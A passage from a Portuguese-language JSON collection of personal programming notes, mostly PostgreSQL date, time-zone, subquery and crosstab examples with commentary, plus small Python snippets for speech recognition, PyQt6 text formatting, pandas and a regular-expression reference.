2, 22);\n SELECT make_time(18, 4, 30.3); \nSELECT make_timestamptz(2018, 2, 22, 18, 4, 30.3, 'Europe/Lisbon');\n\n/* Resultado*/\n2018-02-22 \n18:04:30.3 \n2018-02-22 13:04:30.3-0\n\n\ncurrent_date - retorna a data\ncurrent_time - retorna a atual hora com fuso horario\ncurrent_timestamp - retorna a hora e data com fuso hor\u00e1rio now()\nlocaletime - retorna a hora sem o fuso horario\nlocaltimestamp - retorna a hora e data sem o fuso horario\n\n\n/*Criamos uma tabela que tem 3 colunas\na segunda coluna \u00e9 feita para aramazenar a data e hora\na terceira coluna e feita para armazenar a data e hora\nporem com o relogio do banco de dados\n\n*/\nCREATE TABLE current_time_example(\n\ttime_id bigserial,\n\tcurrent_timestamp_col timestamp with time zone,\n\tclock_timestamp_col timestamp with time zone\n);\n\n\n\n/* Camos inserir os dados nas duas colunas\na primeira coluna ser\u00e1 acrescida com o \ncurrent_timestamp \u00e9 uma data e hora para todas\nas linhas de acordo com a primeira \ne clock_timestamp \u00e9 mais preciso, \ndata e hora para cada linha adicionada\ne isso se repete 1000 vezes\n*/\nINSERT INTO current_time_example(current_timestamp_col, clock_timestamp_col)\n\t(SELECT current_timestamp, clock_timestamp()\n\tFROM generate_series(1, 1000));\n\n\n\n/*Mostra qual o fuso horario est\u00e1 o \nservidor\n*/\nSHOW timezone;\n\nSELECT * FROM pg_timezone_abbrevs; \nSELECT * FROM pg_timezone_names;\n\n\nSELECT * FROM pg_timezone_names WHERE name LIKE 'Europe%';\n\n\n\n/*Set a hora para o lugar que quiser, \nisso dura emquanto estiver conectado\n*/\nSET timezone TO 'US/Pacific';\n\n\n#############################################\nSET timezone TO 'US/Pacific';\n\nCREATE TABLE time_zone_test (\n\ttest_date timestamp with time zone\n);\nINSERT INTO time_zone_test VALUES ('2020-01-01 4:00');\n\tSELECT test_date\nFROM time_zone_test;\n\nSET timezone TO 'US/Eastern';\n\nSELECT test_date\nFROM time_zone_test;\n\nSELECT test_date AT TIME ZONE 'Asia/Seoul'\nFROM time_zone_test;\n\n################################################\n\n\n\n/* Para escobrir o numero de dias entre duas datas,\npor\u00e9m em inteiro*/\nSELECT  TO_DATE('9/30/1929', 'MM/DD/YYYY') - TO_DATE('9/27/1929', 'MM/DD/YYYY') AS resultado;\n\n\n\n/* Adicionando um intervalo de tempo para\ndescrobrir a pr\u00f3xima data*/\nSELECT  TO_DATE('9/30/1929', 'MM/DD/YYYY') + '5 years'::interval AS resultado;\n\n\n/* Selecionamos a coluna que vamos analisar e\nextraimos dela a hora especificando a parte do dado\ndata hora queremos, usamos a fun\u00e7\u00e3o count(*) \nnessa caso para contar o n\u00famero de registros de \ncada grupo, essa fun\u00e7\u00e3o \u00e9 agragada, ou seja, \no count(*) vai trabalhar junto com o GROUP BY,\nentao na hora 0 vai se contar quantos embarques\nforam feitos\n*/\nSELECT\n\tdate_part('hour', embarque) AS trip_hour,\n\tcount(*)\nFROM nyc_yellow_taxi_trips_2016_06_01\nGROUP BY trip_hour\nORDER BY trip_hour;\n\n\n\n/*Primeiramente selecionamos os dados que queremos\na coluna est\u00e1 e dado de data, separamos a hora desse\ndado, percentile_cont(.5) \u00e9 uma fun\u00e7\u00e3o agregada que\ncalcula a mediana ela \u00e9 usada com \nWITHIN GROUP(ORDER BY desembraque - embarque) AS nome\nisso significa que ser\u00e1 calculado e mediana da diferen\u00e7a\ndesses valores, o ORDER BY nesse caso, diz para que conta\ndeve ser feita sempre na ordem de desembarque - embarque\n*/\nSELECT \n\tdate_part('hour', embarque) AS trip_hour,\n\tpercentile_cont(.5)\n\tWITHIN GROUP(ORDER BY\n\tdesembarque - embarque) AS median_trip\nFROM nyc_yellow_taxi_trips_2016_06_01\nGROUP BY trip_hour\nORDER BY trip_hour;\n\n\n\n/*Criamos a tabela, a coluna departure\nest\u00e1 com with time zone, o que significa que\na data completa \u00e9 armazenada com a informa\u00e7\u00e3o\nde fuso hor\u00e1rio\n*/\nCREATE TABLE train_rides(\n\ttrip_id bigserial PRIMARY KEY,\n\tsegment varchar(50) NOT NULL,\n\tdeparture timestamp with time zone NOT NULL,\n\tarrival timestamp with time zone NOT NULL\n);\n\n##########################################################\n/*\n\tPrimeiramente temos que setar o fuso hor\u00e1rio para um lugar \nao nosso gosto, em seguida construimos a tabela, a coluna departure\nest\u00e1 com with time zone, o que significa que\na data completa \u00e9 armazenada com a informa\u00e7\u00e3o\nde fuso hor\u00e1rio. \n\tDepois que criar a tabela, inserimos os dados, dentro desses dados\ntem as datas que vem com o fuso hor\u00e1rio marcado, quando esses valores entram \nna tabela, entram transformados para o hor\u00e1rio do servidor, dessa forma, \ndepois que as datas completas est\u00e3o padronizadas, podemos fazer as contas\n*/\n\nSET timezone TO 'US/Central'; \n\nCREATE TABLE train_rides ( \n\ttrip_id bigserial PRIMARY KEY, \n\tsegment varchar(50) NOT NULL, \n\tdeparture timestamp with time zone NOT NULL,\n\tarrival timestamp with time zone NOT NULL \n); \n\nINSERT INTO train_rides (segment, departure, arrival)\u278c \nVALUES \n\t('Chicago to New York', '2017-11-13 21:30 CST', '2017-11-14 18:23 EST'), \n\t('New York to New Orleans', '2017-11-15 14:15 EST', '2017-11-16 19:32 CST'), \n\t('New Orleans to Los Angeles', '2017-11-17 13:45 CST', '2017-11-18 9:00 PST'), \n\t('Los Angeles to San Francisco', '2017-11-19 10:10 PST', '2017-11-19 21:24 \nPST'), \n\t('San Francisco to Denver', '2017-11-20 9:10 PST', '2017-11-21 18:38 MST'), \n\t('Denver to Chicago', '2017-11-22 19:10 MST', '2017-11-23 14:50 CST'); \nSELECT * FROM train_rides; \n\nFAZENDO AS CONTAS\n\nSELECT segment, \nto_char(departure, 'YYYY-MM-DD HH12:MI a.m. TZ') AS departure,\narrival - departure AS segment_time \nFROM train_rides; \n##################################################################\n\n\n\n/*Selecionamos os dados da coluna da tabela\nque iremos analizar.\no SUM() OVER(ORDER BY trip_id) faz uma soma\ncumulativa, date_part('epoch') transforma a diferen\u00e7a\nda conta em segundos, a somat\u00f3ria acumulada \nvai ser ordenada de acordo com trip_id e multiplicada por\n1 second\n\n*/\nSELECT trip_id,\n\tsegment,\n\tdeparture,\n\tarrival,\n\tarrival - departure AS segment_time,\n\tSUM(date_part('epoch', (arrival-departure))) OVER (ORDER BY trip_id) * interval '1 second' AS cume_time\nFROM train_rides;"}, "reconhecedor de voz - reconhe o que foi dito": {"categoria": "Programas exemplos", "codigo": "import speech_recognition as sr\n\ndef ouvir_audio(duracao):\n\trecognizer = sr.Recognizer()\n\twith sr.Microphone() as source:\n\t\tprint(\"Fale algo...\")\n\t\trecognizer.adjust_for_ambient_noise(source)  # Ajusta para o ru\u00eddo ambiente\n\t\taudio = recognizer.listen(source, timeout=duracao)\n\t\tprint(\"Tempo acabou.\")\n\ttry:\n\t\ttexto = recognizer.recognize_google(audio, language='pt-BR')  # Reconhece o \u00e1udio em portugu\u00eas brasileiro\n\t\treturn texto\n\texcept sr.UnknownValueError:\n\t\tprint(\"N\u00e3o foi poss\u00edvel entender o \u00e1udio.\")\n\texcept sr.RequestError as e:\n\t\tprint(\"Erro no servi\u00e7o de reconhecimento de voz; {0}\".format(e))\n\n# Definindo a dura\u00e7\u00e3o para 6 segundos\nduracao = 6\n\ntexto_comp = []\n# Obtendo o texto ouvido pelo microfone\ntexto = ouvir_audio(duracao)\ntexto_comp.append(texto)\n\nvalor_venda = 50\n\nif str(valor_venda) not in texto:\n\tprint('Atitude suspeita')\n\n# Imprimindo o texto ouvido\nprint(\"Voc\u00ea disse:\", texto)\n\n#################################################################\n\n\nimport threading\nimport speech_recognition as sr\n\nclass AudioRecorder:\n\tdef __init__(self):\n\t\tself.recognizer = sr.Recognizer()\n\t\tself.stop_event = threading.Event()\n\t\tself.audio_data = None\n\t\tself.fala = []\n\t\t\n\tdef ouvir_audio(self):\n\t\twith sr.Microphone() as source:\n\t\t\tprint('Fale Algo...')\n\t\t\tself.recognizer.adjust_for_ambient_noise(source)\n\t\t\twhile not self.stop_event.is_set():\n\t\t\t\ttry:\n\t\t\t\t\tself.audio_data = self.recognizer.listen(source, timeout=1)\n\t\t\t\t\tself.fala.append(self.audio_data)\n\t\t\t\texcept sr.WaitTimeoutError:\n\t\t\t\t\tcontinue\n\t\t\tprint('grava\u00e7\u00e3o interrompida')\n\t\n\tdef start_recording(self):\n\t\tself.stop_event.clear()\n\t\tself.thread = threading.Thread(target=self.ouvir_audio)\n\t\tself.thread.start()\n\t\t\n\tdef stop_recording(self):\n\t\tself.stop_event.set()\n\t\tself.thread.join()\n\t\tif self.audio_data:\n\t\t\tself.process_audio()\n\t\t\tprint(self.fala)\n\t\t\t\n\tdef process_audio(self):\n\t\ttry:\n\t\t\ttexto = self.recognizer.recognize_google(self.audio_data, language='pt-BR')\n\t\t\tprint('Texto reconhecido:', texto)\n\t\texcept sr.UnknownValueError:\n\t\t\tprint('N\u00e3o foi poss\u00edvel entender o \u00e1udio.')\n\t\texcept sr.RequestError as e:\n\t\t\tprint('Erro no reconhecimento de voz')\n\t\t\t\ndef wait_for_keypress():\n\tinput('Pressione Enter para parar a grava\u00e7\u00e3o...\\n')\n\trecorder.stop_recording()\n\n\nrecorder = AudioRecorder()\nrecorder.start_recording()\nwait_for_keypress()\n\n\n"}, "Tecnicas avancadas de consultas": {"categoria": "SQL ", "codigo": "#\n#percentile_cont(.0) WITHIN GROUP (ORDER BY ---)\n/* Vamos descobrir o valor dos 10% maiores\nSelecionamos as colunas que ir\u00e1 aparecer,\nem seguida colocamos a restri\u00e7\u00e3o WHERE\nSELECT percentile_cont(.9) WITHIN GROUP (ORDER BY ---)\nessa parte ordena os dados de acordo com uma coluna\nem seguida encontra o valor que representa 90%,\no valor da tabela mesmo igual 197465, acima desse valor\nest\u00e3o os 10% maiores, ent\u00e3o o SELECT \u00e9 usado para fazer \numa conta de acordo com a tabela desejada\n*/\nSELECT geo_name,\n\tstate_us_abreviation,\n\tp0010001\nFROM us_counties_2010\nWHERE p0010001 >= (\n\tSELECT percentile_cont(.9) WITHIN GROUP (ORDER BY p0010001)\n\tFROM us_counties_2010) \nORDER BY p0010001 DESC;\n\n\nDELETE FROM us_counties_2010_top10\nWHERE p0010001 < (\n\tSELECT percentile_cont(.9) WITHIN GROUP(ORDER BY p0010001)\n\tFROM us_counties_2010_top10\n);\n\n\n##########################################\n\n--census = state_us_abreviation\n--plants = meat_poultry_egg_inspect\n/*Aqui \u00e9 a consulta principal, depois que\nconstruimos as tabelas de consulta, \n1) encontrar o St\n2) encontrar a popula\u00e7\u00e3o por estado\n3) encontrar a quantidade de fazendas\n4) fazer a conta na consulta principal\n*/\nSELECT census.state_us_abreviation AS St,\n\tcensus.st_population,\n\tplants.plant_count,\n\tround((plants.plant_count/census.st_population::numeric(10,1))*1000000, 1) \n\tAS plants_per_milion_hab\n\n\nFROM \n\t(--c1 = st c2 = nm_fazendas\n\tSELECT st,\n\tcount(*) AS plant_count\n\tFROM meat_poultry_egg_inspect\n\tGROUP BY st\n\t) \n\tAS plants\n\t\nJOIN --c1 = st c2 = popula\u00e7\u00e3o_estado\n\t(SELECT state_us_abreviation,\n\tsum(p0010001) AS st_population\n\tFROM us_counties_2010\n\tGROUP BY state_us_abreviation\n\t)\n\tAS census\n\t\nON plants.st = census.state_us_abreviation\nORDER BY plants_per_milion_hab DESC;\n\n\n############################################\n\n\nSELECT geo_name,\n\tstate_us_abreviation AS st,\n\tp0010001 AS total_pop,\n\t(SELECT percentile_cont(0.5) WITHIN GROUP(ORDER BY p0010001)\n\tFROM us_counties_2010) AS median,\n\tp0010001 - (SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY p0010001)\n\tFROM us_counties_2010) AS diff\n\t\nFROM us_counties_2010\nWHERE (p0010001 - (SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY p0010001)\n\t\t\t\t FROM us_counties_2010)) \nBETWEEN -1000 AND 1000;\n\t\t\t\t \n##############################################\n\n\n/*Filtramos com a fun\u00e7\u00e3o agregada\nid esta na lista de ids da tabela\nretirees\n*/\nSELECT first_name,\n\tlast_name\nFROM employees\nWHERE id IN (\n\tSELECT id\n\tFROM retirees);\n\n####################################################\n/*\nEXISTS () verifica se \u00e9 verdadeiro ou n\u00e3o,\nent\u00e3o vai retornar apenas os nomes\nque est\u00e3o dentro da linha,\ncada vez que a linha passar\nverificar\u00e1 se \u00e9 verdade \nou falso, se existir\nescreva, se n\u00e3o existir n\u00e3o escreva\n*/\nSELECT first_name,\n\tlast_name\nFROM employees\nWHERE EXISTS (\n\tSELECT id\n\tFROM retirees);\n\n##################################################\n\n/*\nSe n\u00e3o existir no mundo \nescreva, e existir, n\u00e3o escreva.\nretorna todas as pessoas que n\u00e3o\nest\u00e3o na subconsulta\n*/\nSELECT first_name,\n\tlast_name\nFROM employees\nWHERE NOT EXISTS (\n\tSELECT id\n\tFROM retirees\n\tWHERE id = employees.id)   \n\n##################################################\n/*\nPrimeiramente fazemos as tabelas tempor\u00e1rias\npara poder fazer as analises, em seguida \nfazemos uma consulta padr\u00e3o, podemos usar \no JOIN para poder analisar as duas tabelas\nao mesmo tempo, usamos tamb\u00e9m o ON para \nexibir apenas valores dos quais est\u00e3o iguais\nnas duas tabelas\n*/\nWITH \n--Tabela 1\n\tcounties(st, population) AS\n\t(SELECT state_us_abreviation,\n\tsum(population_count_100_percent)\n\tFROM us_counties_2010\n\tGROUP BY state_us_abreviation),\n--Tabela 2\t\n\tplants(st, plants_count) AS\n\t(SELECT st,\n\t count(*) AS plants_count\n\t FROM meat_poultry_egg_inspect\n\t GROUp BY st\n\t)\n--Consulta padr\u00e3o\t\nSELECT counties.st AS estados_count,\n\tcounties.population AS populacao_do_estado,\n\tplants.st AS estados_pant,\n\tplants.plants_count AS plantacoes_por_estado,\n\tround((plants.plants_count/counties.population::numeric(10,2))*1000000, 5)\n\tAS plantacoes_por_milhao_hab\nFROM counties JOIN plants\n--Especifica\u00e7\u00f5es\nON counties.st = plants.st\nORDER BY plantacoes_por_milhao_hab DESC;\n\n###################################################################\n\n/*Usamos o CROSS JOIN para quando a consulta\nn\u00e3o tem uma rela\u00e7\u00e3o espec\u00edfica entre as colunas\ncomo mostrar resultados de calculos finalizados\npor exemplo\n*/\nWITH us_median AS\n\t(SELECT percentile_cont(0.5)\n\tWITHIN GROUP (ORDER BY p0010001) AS us_median_pop\n\tFROM us_counties_2010),\n\t\n\tus_media AS\n\t(SELECT avg(p0010001) AS us_media_pop\n\tFROM us_counties_2010)\n\t\nSELECT us_median.us_median_pop AS mediana_pop,\n\t\tus_media.us_media_pop AS media_pop,\n\t\tround((us_media.us_media_pop - us_median.us_median_pop::numeric), 1) AS diff_media_mediana\nFROM us_median CROSS JOIN us_media;\n\n\n##################################################################\n\n\n/*\nFizemos uma tabela de uma coluna e uma linha com o\nresultado de um calulo matematico,\nem seguida fazemos a consulta principal\nnessa consulta principal, nos pegamos dados\nde uma tabela ja existente no banco de dados\ne usamos o dados da tabela temporaria para fazer\nmais contas, por isso usamos o CROSS JOIN,\npois n\u00e3o estamos trabalhando com relacional\nsamuel tb_1 ---- samuel tb_2\n*/\nWITH us_median AS\n\t(SELECT percentile_cont(.5)\n\tWITHIN GROUP (ORDER BY p0010001) AS us_median_pop\n\tFROM us_counties_2010)\n\nSELECT geo_name,\n\tstate_us_abreviation AS st,\n\tp0010001 AS total_pop,\n\tus_median.us_median_pop,\n\tp0010001 - us_median.us_median_pop AS diff_from_median\nFROM us_counties_2010 CROSS JOIN us_median\nWHERE (p0010001 - us_median_pop)\nBETWEEN -1000 AND 1000\nORDER BY diff_from_median DESC;\n\n##################################################################\ncrosstab()\nCREATE EXTENSION tablefunc;"}, "crosstab - transformar linhas em colunas": {"categoria": "SQL ", "codigo": "cross Table\nQuantos votos cada escrtorio teve por sabor? Ranqueado por escolha de sabor.\n\nSELECT office,\n\tflavor,\n\tcount(*)\nFROM ice_cream_survey\nGROUP BY (office, flavor)\nORDER BY office, count(*) DESC;\n\n\"Downtown\"\t\"Strawberry\"\t32\n\"Downtown\"\t\"Chocolate\"\t23\n\"Downtown\"\t\"Vanilla\"\t19\n\"Midtown\"\t\"Chocolate\"\t41\n\"Midtown\"\t\"Vanilla\"\t23\n\"Uptown\"\t\"Vanilla\"\t23\n\"Uptown\"\t\"Chocolate\"\t22\n\"Uptown\"\t\"Strawberry\"\t17\n\n\nOrdem das novas colunas:\n\nSELECT flavor\nFROM ice_cream_survey\nGROUP BY flavor\nORDER BY flavor;\n\nChocolate | Strawberry | Vanilla\n#################################################################\nCruzar as Tableas:\n\nSELECT * \nFROM crosstab('SELECT office,\n\t\t\t  \t\tflavor,\n\t\t\t  \t\tcount(*)\n\t\t\t  FROM ice_cream_survey\n\t\t\t  GROUP BY office, flavor\n\t\t\t  ORDER BY office, count(*) DESC',\n\t\t\t \n\t\t\t 'SELECT flavor\n\t\t\t  FROM ice_cream_survey\n\t\t\t  GROUP BY flavor\n\t\t\t  ORDER BY flavor')\n\nAS (office varchar(20),\n\tcholate bigint,\n\tstrawberry bigint,\n\tvanilla bigint);\n\n\n\n\n\n#################################################################\n/*Nessa parte do c\u00f3digo, selecionamos as colunas que vamos consultar\ndepois descobrimos a mediana das temperaturas de cada m\u00eas,\nagrupamos por estado e o m\u00eas e ordenamos por nome do estado\n*/\nSELECT *\nFROM crosstab('SELECT\n\t\t\t  station_name,\n\t\t\t  date_part(''month'', observation_date),\n\t\t\t  percentile_cont(0.5)\n\t\t\t  WITHIN GROUP (ORDER BY max_temp)\n\t\t\t  FROM temperature_readings\n\t\t\t  GROUP BY station_name,\n\t\t\t  \t\t\tdate_part(''month'', observation_date)\n\t\t\t  ORDER BY station_name',\n\t\t\t \n\t\t\t 'SELECT month FROM generate_series(1,12) month')\n\t\t\t AS (station varchar(50),\n\t\t\t\t jan numeric(3,0),\n\t\t\t\t feb numeric(3,0),\n\t\t\t\t mar numeric(3,0),\n\t\t\t\t apr numeric(3,0),\n\t\t\t\t may numeric(3,0),\n\t\t\t\t jun numeric(3,0),\n\t\t\t\t jul numeric(3,0),\n\t\t\t\t aug numeric(3,0),\n\t\t\t\t sep numeric(3,0),\n\t\t\t\t oct numeric(3,0),\n\t\t\t\t nov numeric(3,0),\n\t\t\t\t dec numeric(3,0)\n);\n\n"}, "Caderno": {"codigo": "WITH tabela_final AS \n(SELECT station_name,\n\t\tdate_part('month', observation_date) AS mes,\n\t\tpercentile_cont(0.5) WITHIN GROUP (ORDER BY max_temp)::integer AS mediana_temp\n\tFROM temperature_readings\n\t WHERE station_name = 'CHICAGO NORTHERLY ISLAND IL US'\n\tGROUP BY station_name, mes\n\tORDER BY station_name, mes)\n\nUPDATE temperature_readings_final\nSET chicago_northerly_island_il_us = mediana_temp\nFROM tabela_final;", "categoria": "SQL "}, "QTextCharFormat() - mudar a forma do texto no QTextEdit": {"categoria": "PyQt6", "codigo": "\tdef mudar_cor(self):\n\t\ttask_selecionada = self.task_combo.currentText()\n\t\tcursor = self.caderno_tedit.textCursor()\n\t\ttexto_selecionado = cursor.selectedText()\n\t\t\n\t\tchar_format = QTextCharFormat()\n\t\t#char_format.setBackground(QColor(Qt.GlobalColor.Blue))\n\t\t#char_format.setForeground(QColor(Qt.GlobalColor.blue))\n\t\tchar_format.setForeground(QColor('#FFFFFF'))\n\t\tcursor.setCharFormat(char_format)\n\t\t\n\t\tself.caderno_dic[task_selecionada] = self.caderno_tedit.toPlainText()\n\t\t\n\t\t\n\t\t\n\t\tself.salvar_json(self.arquivo, self.caderno_dic)\n\t\t\n\n\t\t\n\t\t\n\t\t\n\t\t#extra_selections = []\n\t\t#color = QColor(Qt.GlobalColor.red)\n\n\t\t#selection = QTextEdit.ExtraSelection()\n\t\t#selection.format.setBackground(color)\n\t\t#extra_selections.append(selection)\n\t\t#self.caderno_tedit.setExtraSelections(extra_selections)\n\t\t#print(extra_selections)\n\t\t\n\t\tprint(texto_selecionado)\n\n\n\n\n\n\n\n mudar_cor(self):\n\t\tfind_text, ok = QInputDialog.getText(\n\t\tself, 'Search Text', 'Find:')\n\t\tif ok:\n\t\t\textra_selections = []\n\t\t\t\n\t\t\tself.caderno_tedit.moveCursor(\n\t\t\tQTextCursor.MoveOperation.Start)\n\t\t\t\n\t\t\tcolor = QColor(Qt.GlobalColor.gray)\n\t\t\t\n\t\t\twhile(self.caderno_tedit.find(find_text)):\n\t\t\t\tselection = QTextEdit.ExtraSelection()\n\t\t\t\tselection.format.setBackground(color)\n\t\t\t\t\n\t\t\tselection.cursor = self.caderno_tedit.textCursor()\n\t\t\textra_selections.append(selection)\n\t\t\tself.caderno_tedit.setExtraSelections(extra_selections)\n\t\t\t\n\t\t\tself.caderno_dic[self.task_combo.currentText()] = self.caderno_tedit.toPlainText()\n\t\t\tself.salvar_json(self.arquivo, self.caderno_dic)\n\t\t\t"}, "replace() - trocar caractere do texto": {"codigo": "\ntexto = '\u00e9u estou aqui'\ntexto_formatado = texto.replace('\u00e9', 'e')", "categoria": "Python Geral"}, "salvar e carregar texto em arquivo (pode ser csv)": {"codigo": "#Estamos carregando as informa\u00e7\u00f5es em texto\nwith open(\n'C:/Users/pcleu/Documents/ajustados_2023/infra\u00e7oes2023_01.csv', 'r') as arquivo:\n\tconteudo_csv = arquivo.read()\n\n\n#Estamos salvando o texto em arquivo\nwith open(\n'C:/Users/pcleu/Documents/ajustados_2023/infra\u00e7oes2023_01c.csv', 'w') as arquivo:\n\tarquivo.write(texto_final)\n", "categoria": "Python Geral"}, "encoding UTF-8 - codificando para o formato UFT-8": {"codigo": "import pandas as pd\n\ndf = pd.read_csv('C:/Users/pcleu/Documents/ajustados_2023/infra\u00e7oes2023_01c.csv')\ndt.to_csv('C:/Users/pcleu/Documents/ajustados_2023/infra\u00e7oes2023_01c.csv', encoding='utf-8', index=False)", "categoria": "Pandas"}, "PARTITION BY \\ ROW_NUMBER() - ranqueia particionado": {"categoria": "SQL ", "codigo": "/*primeiro vamos fazer uma tabela tempor\u00e1ria para analisar os dados\nposteriormente. Selecionamos a colunas, codigo_infracao,\ndescricao_infracao, uf_infracao e contamos quantos tipos de infracoes\ntem por estado, porem queremos saber quais s\u00e3o as 5 infracoes mais \npertinentes por estado, ent\u00e3o usamos o ROW_NUMBER () ele acrescenta \num numero para cada coluna, comeca com 1 e conta, usamos o PARTITION BY\nporque queremos particionar os dados apartir do uf_infracao que \u00e9\nordernado de acordo com numero de infracoes de forma decrescente e\nnomeia essa coluna como rank.\n\nPARTITION BY uf_infracao: Divide as linhas em parti\u00e7\u00f5es baseadas na coluna uf_infracao.\nORDER BY COUNT(codigo_infracao) DESC: Dentro de cada parti\u00e7\u00e3o, ordena as linhas pelo n\u00famero de ocorr\u00eancias de codigo_infracao em ordem decrescente.\n\n*/\nWITH rank_estado_infracao AS\n\t(SELECT codigo_infracao,\n\t \t\tdescricao_infracao,\n\t \t\tuf_infracao,\n\t \t\tcount(codigo_infracao) AS numr_multas,\n\t \t\tROW_NUMBER() OVER (PARTITION BY uf_infracao ORDER BY count(codigo_infracao) DESC) AS rank\n\t FROM infracoes_2023_01\n\t GROUP BY codigo_infracao, descricao_infracao, uf_infracao)\n\t\t\t\n\t \n\nSELECT * FROM rank_estado_infracao\nWHERE rank <= 5;\n"}, "random() - sorteio": {"codigo": "x = random.randint(0, 99)\ny = random.randint(0,99)\n\npoicao = [1,2,3,4,5,6,7,8,9,10]\n\nx = random.choice(posicao)\ny = random.choice(posicao)", "categoria": "Python Geral"}, "subquery ": {"codigo": "/* A fun\u00e7\u00e3o \n*/\n\nSELECT *\nFROM (\n    SELECT max_temp,\n        CASE \n            WHEN max_temp >= 90 THEN 'Hot'\n            WHEN max_temp BETWEEN 70 AND 89 THEN 'Warm'\n            WHEN max_temp BETWEEN 50 AND 69 THEN 'Pleasant'\n            WHEN max_temp BETWEEN 33 AND 49 THEN 'Cold'\n            WHEN max_temp BETWEEN 20 AND 32 THEN 'Freezing'\n            ELSE 'Inhumane'\n        END AS temperature_group\n    FROM temperature_readings\n) AS subquery\nWHERE temperature_group = 'Inhumane';", "categoria": "SQL "}, "CASE - se isto, ent\u00e3o... (l\u00f3gica em consultas)": {"categoria": "SQL ", "codigo": "SELECT max_temp,\n\tCASE WHEN max_temp >= 90 THEN 'Hot'\n\t\tWHEN max_temp BETWEEN 70 AND 89 THEN 'Warm'\n\t\tWHEN max_temp BETWEEN 50 AND 69 THEN 'Pleasant'\n\t\tWHEN max_temp BETWEEN 33 AND 49 THEN 'Cold'\n\t\tWHEN max_temp BETWEEN 20 AND 32 THEN 'Freezing'\n\tELSE 'Inhumane'\nEND AS temperature_group\n\t\nFROM temperature_readings;\n\n\n\n\nWITH temps_collapsed (station_name, max_temperature_group) AS \n(SELECT station_name,\n\tCASE WHEN max_temp >= 90 THEN 'Hot'\n\t\tWHEN max_temp BETWEEN 70 AND 89 THEN 'Warm'\n\t\tWHEN max_temp BETWEEN 50 AND 69 THEN 'Pleasant'\n\t\tWHEN max_temp BETWEEN 33 AND 49 THEN  'Cold'\n\t\tWHEN max_temp BETWEEN 20 AND 32 THEN 'Freezing'\n\tELSE 'Inhumane'\nEND\nFROM temperature_readings)\nSELECT station_name,\n\tmax_temperature_group,\n\tcount(*)\nFROM temps_collapsed\nGROUP BY station_name, max_temperature_group\nORDER BY station_name, count(*) DESC;"}, "formatacao ": {"categoria": "SQL ", "codigo": "SELECT upper('hello'); --tudo mai\u00fasculo\n\nSELECT lower('HELLO'); --tudo min\u00fasculo\n\nSELECT initcap('at the end of the day '); --primeira letra mai\u00fascula de cada come\u00e7o de palavra\n\nSELECT char_length('ola '); -- quantos caracteres tem, conta os espa\u00e7os tamb\u00e9m\n\nSELECT trim('s' FROM 'socks');  -- remove o caractere desejado no in\u00edcio da palavra\n\nSELECT trim(trailing 's' FROM 'socks');  --remove o caractere desejado no final da palavra\n\nSELECT trim(' pat ');  --remove os caracteres vazios no in\u00edcio e no final da palavra\n\nSELECT rtrim('socks', 's'); -- remove o caractere da direita, retorna sock\n\nSELECT left('888999222', 3); --retorna apenas os tr\u00eas primeiros caracteres da esquerda\n\nSELECT left('888999222', 3); --retorna apenas os tr\u00eas primeiros caracteres da direita\n\nSELECT replace('suchs', 's', 'b'); -- substitui o 's' por 'b' na palavra"}, "Regular Expression Notation": {"categoria": "SQL ", "codigo": "SELECT substring('The game starts at 7 p.m. on May 2, 2019.' from '\\d{4}'); \n\n\n\n\n. Um ponto \u00e9 um curinga que encontra qualquer caractere, exceto uma nova linha.\n[FGz] Qualquer caractere entre colchetes. Aqui, F, G ou z.\n[a-z] Uma variedade de caracteres. Aqui, letras min\u00fasculas de a a z.\n[^a-z] O cursor nega a correspond\u00eancia. Aqui, n\u00e3o letras min\u00fasculas de a a z.\n\\w Qualquer caractere de palavra ou sublinhado. O mesmo que [A-Za-z0-9_].\n\\dQualquer d\u00edgito.\n\\s Um espa\u00e7o.\nCaractere \\tTab.\n\\nCaractere de nova linha.\n\\r Caractere de retorno de carro.\n^ Combine no in\u00edcio de uma string.\n$ Corresponde ao final de uma string.\n? Obtenha a correspond\u00eancia anterior zero ou uma vez.\n* Obtenha a correspond\u00eancia anterior zero ou mais vezes.\n+ Obtenha a correspond\u00eancia anterior uma ou mais vezes.\n.+ Obtenha a correspond\u00eancia posterior uma ou mais vezes de caracteres.\n{m} Obtenha a correspond\u00eancia anterior exatamente m vezes.\n{m,n} Obtenha a correspond\u00eancia anterior entre m e n vezes.\na|b O tubo denota altern\u00e2ncia. Encontre a ou b.\n( ) Criar e reportar um grupo de captura ou definir preced\u00eancia.\n(?: ) Negar o relato de um grupo de captura.\n\n\n\n\nUsando essas express\u00f5es regulares b\u00e1sicas, voc\u00ea pode combinar v\u00e1rios tipos de\ncaracteres e tamb\u00e9m indicar quantas vezes e onde combin\u00e1-los.\nPor exemplo, colocar caracteres entre colchetes ([]) permite combinar\nqualquer caractere \u00fanico ou um intervalo. Ent\u00e3o, [FGz] corresponde a um \u00fanico F, G ou z,\nenquanto [A-Za-z] corresponder\u00e1 a qualquer letra mai\u00fascula ou min\u00fascula.\nA barra invertida (\\) precede um designador para caracteres especiais, como um\ntabula\u00e7\u00e3o (\\t), d\u00edgito (\\d) ou nova linha (\\n), que \u00e9 um caractere de final de linha no texto\narquivos.\nExistem v\u00e1rias maneiras de indicar quantas vezes corresponder a um\npersonagem. Colocar um n\u00famero entre chaves indica que voc\u00ea deseja\ncombine isso muitas vezes. Por exemplo, \\d{4} corresponde a quatro d\u00edgitos seguidos,\ne \\d{1,4} corresponde a um d\u00edgito entre uma e quatro vezes.\nOs caracteres ?, * e + fornecem uma nota\u00e7\u00e3o abreviada \u00fatil para o\nn\u00famero de partidas. Por exemplo, o sinal de mais (+) ap\u00f3s um caractere\nindica combin\u00e1-lo uma ou mais vezes. Ent\u00e3o, a express\u00e3o a+ encontraria\nos caracteres aa na string aardvark.\nAl\u00e9m disso, os par\u00eanteses indicam um grupo de captura, que voc\u00ea pode usar para\nespecifique apenas uma parte do texto correspondente para exibir nos resultados da consulta.\nIsto \u00e9 \u00fatil para reportar apenas uma parte de uma express\u00e3o correspondente. Para\nPor exemplo, se voc\u00ea estivesse procurando um formato de hora HH:MM:SS em texto e\nquiser informar apenas a hora, voc\u00ea poderia usar uma express\u00e3o como\n(\\d{2}):\\d{2}:\\d{2}. Isto procura dois d\u00edgitos (\\d{2}) da hora seguidos por\ndois d\u00edgitos, outros dois d\u00edgitos para os minutos e dois pontos e, em seguida, os segundos de dois d\u00edgitos. Colocando o primeiro \\d{2} entre par\u00eanteses, voc\u00ea pode extrair\napenas esses dois d\u00edgitos, mesmo que a express\u00e3o inteira corresponda ao completo\ntempo.\nA Tabela 13-2 